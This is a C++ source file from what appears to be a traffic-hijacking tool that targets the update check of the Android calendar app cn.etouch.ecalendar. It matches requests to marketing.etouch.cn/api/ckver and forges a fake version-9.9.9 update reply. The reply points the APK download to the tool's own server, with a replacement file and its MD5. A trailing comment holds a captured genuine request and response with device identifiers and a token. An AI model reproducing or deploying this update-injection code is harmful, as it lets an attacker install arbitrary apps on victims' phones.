#include <windows.h>
#include "zhwnl.h"
#include "../HttpUtils.h"
#include "sslPublic.h"
#include "../cipher/CryptoUtils.h"


int ZHWNL::isZhwnl(string url, string host) {
	if (host.find("marketing.etouch.cn") != -1 && url.find("/api/ckver?") != -1)
	{
		return TRUE;
	}
	return FALSE;
}


int ZHWNL::replyZhwnl(char * dstbuf, int buflen, int buflimit, string username) {
	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: text/xml;charset=utf-8\r\n"
		"Content-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	int ret = 0;

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + username;

	string ver = "9.9.9";
	int iver = 999;

	string filename = Public::getUserPluginPath(username) + ANDROID_REPLACE_FILENAME;

	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, FALSE);

	char hdrformat[4096];
	char szformat[] = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\r\n"
		"<resp><head><status>1000</status><desc><![CDATA[OK]]></desc></head><data><data><title>发现新版本</title>"
		"<btn>立即升级</btn><lv>0</lv><f>0</f><vc>%u</vc><vn>%s</vn><vd>"
		"<![CDATA[1、整体功能化繁为简，清晰一目了然"
		"2、黄历天气美图，上滑一触即达"
		"3、修正多处问题，提升体验]]></vd><tp>apk</tp><url><![CDATA[http://%s/%s]]>"
		"</url><md5><![CDATA[%s]]></md5><channel>"
		"<![CDATA[]]></channel><baseId><![CDATA[]]></baseId><patchCode><![CDATA[0]]></patchCode></data></data></resp>";
	int httphdrlen = sprintf_s(hdrformat, 4096, szformat,
		iver, ver.c_str(), strip.c_str(), ANDROID_REPLACE_FILENAME, szmd5);

	int retlen = sprintf(dstbuf, szHttpPartialZipFormat, httphdrlen, hdrformat);

	return retlen;
}


/*
GET /api/ckver?ver_code=779&device_id=7b3976e5262fa5b6f42289fd089ec1e3&local_svc_version=779&pkg=cn.etouch.ecalendar&dev=android_phone&city_key=101210101&app_ts=1564019672130&uid=&os_version=70&up=ANDROID&app_sign=d2cb42b84c9f57c7a43cc5fd1d501bfe&auth_token=eyJhY2N0ayI6IiIsInVwIjoiQU5EUk9JRCIsImRldmljZSI6IkhVQVdFSUNBWi1BTDEwODY0NTkwMDMzMjE1NzUyIn0%3D&acctk=&epid=b848d224-aeb1-403a-8c5b-1b0e5c0f12b9&devid=cea7d302d58eb95c52fa1d23451c68cc&app_key=99817749&device=HUAWEICAZ-AL10864590033215752&channel=huawei&ver_name=7.5.8 HTTP/1.1
User-Agent: Mozilla/5.0 (Linux; Android 7.0; HUAWEI CAZ-AL10 Build/HUAWEICAZ-AL10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 ssy={ECalendar;V7.5.8;huawei;101210114;}
Host: marketing.etouch.cn
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Server: Tengine/2.1.2
Date: Thu, 25 Jul 2019 01:54:32 GMT
Content-Type: text/xml;charset=utf-8
Transfer-Encoding: chunked
Cache-Control: max-age=10800,must-revalidate
Cache-Control: must-revalidate, max-age=300

286
<?xml version="1.0" encoding="UTF-8" ?><resp><head><status>1000</status><desc><![CDATA[OK]]></desc></head><data><data><title>发现新版本</title><btn>立即升级</btn><lv>0</lv><f>0</f><vc>755</vc><vn>7.3.0</vn><vd><![CDATA[1、整体功能化繁为简，清晰一目了然
2、黄历天气美图，上滑一触即达
3、修正多处问题，提升体验]]></vd><tp>apk</tp><url><![CDATA[http://ustatic.ufile.ucloud.com.cn/zhwnl_v7.3.0_755_update_release.apk]]>
</url><md5><![CDATA[e192a360927a0359b81f6a9f722795b0]]></md5><channel>
<![CDATA[]]></channel><baseId><![CDATA[]]></baseId><patchCode><![CDATA[0]]></patchCode></data></data></resp>
0
*/